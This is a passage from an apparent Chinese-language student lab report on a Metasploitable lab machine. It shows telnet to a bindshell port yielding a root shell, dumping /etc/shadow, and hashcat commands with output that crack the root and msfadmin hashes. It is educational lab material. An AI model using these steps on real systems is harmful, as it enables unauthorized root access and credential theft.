msfadmin:$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:19107:0:99999:7:::
...
```

![4.5](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081920329.png)

### 4.2 弱口令类

#### 4.2.1 `bindshell`

```
[3:58:19] xubiang:EXP1 $ telnet 192.168.43.38 1524
Trying 192.168.43.38...
Connected to 192.168.43.38.
Escape character is '^]'.
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:/# root@metasploitable:/# cat /etc/shadow
root:$1$7DSzfpME$3a45316tWZF9TZWi48eub/:19107:0:99999:7:::
...
msfadmin:$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:19107:0:99999:7:::
...
```

![4.4-bindshell](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081603459.png)

<div style="page-break-after:always;"></div>

## 5. `Shadow`内容

- `msfadmin`账号的内容：`msfadmin:$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:19107:0:99999:7:::`
- `root`账号的内容：`root:$1$7DSzfpME$3a45316tWZF9TZWi48eub/:19107:0:99999:7:::`

<div style="page-break-after:always;"></div>

## 6. 密码破解

### 6.1 `/etc/shadow`文件的格式

- `Username`：用户名
- `Encrypted Password`：密码使用的加密算法及加密后的密码
  - `$1$`：`MD5`
  - `$2a$`：`Blowfish`
  - `$2y$`：`Eksblowfish`
  - `$5$`：`SHA256`
  - `$6$`：`SHA512`
- `Last Password Change`：上次密码修改时间
- `Minimum Password Age`：距离下次可以修改密码的最少时间
- `Maximum Password Age`：密码的最大有效时间
- `Warning Period`：密码在到期多少天前通知用户
- `Inactivity Period`：密码在到期多少天后冻结用户
- `Expiration Date`：密码到期时间

```
mark:$6$.n.:17736:0:99999:7:::
[--] [----] [---] - [---] ----
|      |      |   |   |   |||+-----------> 9. Unused
|      |      |   |   |   ||+------------> 8. Expiration date
|      |      |   |   |   |+-------------> 7. Inactivity period
|      |      |   |   |   +--------------> 6. Warning period
|      |      |   |   +------------------> 5. Maximum password age
|      |      |   +----------------------> 4. Minimum password age
|      |      +--------------------------> 3. Last password change
|      +---------------------------------> 2. Encrypted Password
+----------------------------------------> 1. Username
```

### 6.2 密码破解

- 加密模式：根据`/etc/shadow`文件的格式可知，口令使用`MD5`加密，因此模式应为`500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System`；
- 攻击模式：`3 | Send hashed passwords and attack positions`；
- 密文文件：将`msfadmin`对应的口令密文`$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/`存储在`.\cyphertext\msfadmin.txt`中，将`root`对应的密文`$1$7DSzfpME$3a45316tWZF9TZWi48eub/`存储在`.\cyphertext\root.txt`中；
- 已知密码长度为`6`位且均为数字或字母，使用以下命令进行破解：
  - 结果：`msfadmin`的口令为`hjj123`；`root`的口令为`10ser1`。


```
➜ .\hashcat --hash-type 500 --attack-mode 3 .\cyphertext\msfadmin.txt --custom-charset1 ?d?l ?1?1?1?1?1?1
hashcat (v6.2.0) starting...

...

OpenCL API (OpenCL 3.0 CUDA 11.6.127) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1050 Ti, 3584/4095 MB (1023 MB allocatable), 6MCU

...

$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:hjj123

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/
Time.Started.....: Wed Apr 27 19:35:20 2022 (1 sec)
Time.Estimated...: Wed Apr 27 19:35:21 2022 (0 secs)
Guess.Mask.......: ?1?1?1?1?1?1 [6]
Guess.Charset....: -1 ?d?l, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   336.3 kH/s (8.93ms) @ Accel:4 Loops:125 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 393216/2176782336 (0.02%)
Rejected.........: 0/393216 (0.00%)
Restore.Point....: 0/60466176 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:15-16 Iteration:875-1000
Candidates.#1....: harier -> hcxfie
Hardware.Mon.#1..: Temp: 53c Util: 98% Core:1114MHz Mem:3504MHz Bus:16

Started: Wed Apr 27 19:34:58 2022
Stopped: Wed Apr 27 19:35:22 2022
```

```
➜ .\hashcat --hash-type 500 --attack-mode 3 .\cyphertext\root.txt --custom-charset1 ?d?l ?1?1?1?1?1?1
hashcat (v6.2.0) starting...

...

OpenCL API (OpenCL 3.0 CUDA 11.6.127) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1050 Ti, 3584/4095 MB (1023 MB allocatable), 6MCU

...

$1$7DSzfpME$3a45316tWZF9TZWi48eub/:10ser1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$7DSzfpME$3a45316tWZF9TZWi48eub/
Time.Started.....: Wed Apr 27 19:38:12 2022 (22 mins, 45 secs)
Time.Estimated...: Wed Apr 27 20:00:57 2022 (0 secs)
Guess.Mask.......: ?1?1?1?1?1?1 [6]
Guess.Charset....: -1 ?d?l, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   315.1 kH/s (4.31ms) @ Accel:4 Loops:62 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 422977536/2176782336 (19.43%)
Rejected.........: 0/422977536 (0.00%)
Restore.Point....: 11747328/60466176 (19.43%)
Restore.Sub.#1...: Salt:0 Amplifier:2-3 Iteration:992-1000
Candidates.#1....: 1pt5qi -> 1nlstt
Hardware.Mon.#1..: Temp: 64c Util: 98% Core:1722MHz Mem:3504MHz Bus:16

Started: Wed Apr 27 19:38:06 2022
Stopped: Wed Apr 27 20:00:59 2022
```

![6.1-msfadmin的密码](https://raw.githubusercontent.com/BIIIANG/pic/main/202205072255626.png)

![6.2-root的密码](https://raw.githubusercontent.com/BIIIANG/pic/main/202205072255537.png)

# 附录1 NMAP

- 见`APPENDIX.md`。

# 附录2 HASHCAT

- 见`APPENDIX.md`。

